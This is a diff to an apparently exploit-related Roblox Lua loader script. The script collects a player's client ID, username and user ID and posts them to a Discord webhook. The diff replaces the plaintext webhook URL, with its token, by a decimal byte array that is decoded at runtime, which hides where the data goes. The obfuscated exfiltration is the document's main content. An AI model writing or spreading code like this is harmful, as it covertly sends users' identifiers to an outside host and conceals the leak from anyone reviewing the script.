@@ -6,7 +6,19 @@ local r1_01 = game:GetService("RbxAnalyticsService"):GetClientId()
 local username = LocalPlayer.Name
 local userid = tostring(LocalPlayer.UserId)
 
-local r1_02 = "https://discord.com/api/webhooks/1501152648852803598/a2mn2CKXhpYcNYMhn0LHdxRy-Ht3FJsodv5akQ_gEdZuXBwxe5Vmvbsl0KgPtCvpMnES"
+local encoded = {
+    104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 49, 49, 53, 50, 54, 52, 56, 56, 53, 50, 56, 48, 51, 53, 57, 56, 47, 97, 50, 109, 110, 50, 67, 75, 88, 104, 112, 89, 99, 78, 89, 77, 104, 110, 48, 76, 72, 100, 120, 82, 121, 45, 72, 116, 51, 70, 74, 115, 111, 100, 118, 53, 97, 107, 81, 95, 103, 69, 100, 90, 117, 88, 66, 119, 120, 101, 53, 86, 109, 118, 98, 115, 108, 48, 75, 103, 80, 116, 67, 118, 112, 77, 110, 69, 83
+}
+
+local function decodeUrl(encoded)
+    local decoded = ""
+    for i = 1, #encoded do
+        decoded = decoded .. string.char(encoded[i])
+    end
+    return decoded
+end
+
+local r1_02 = decodeUrl(encoded)
 
 if r1_02 ~= "" then
     local requestFunc = request or http_request
@@ -145,5 +157,3 @@ else
     
     getgenv().l0ader = nil
 end
-
--- DO NOT TOUCH ANYTHING HERE, ITS FINISHED AND FUNCTIONAL
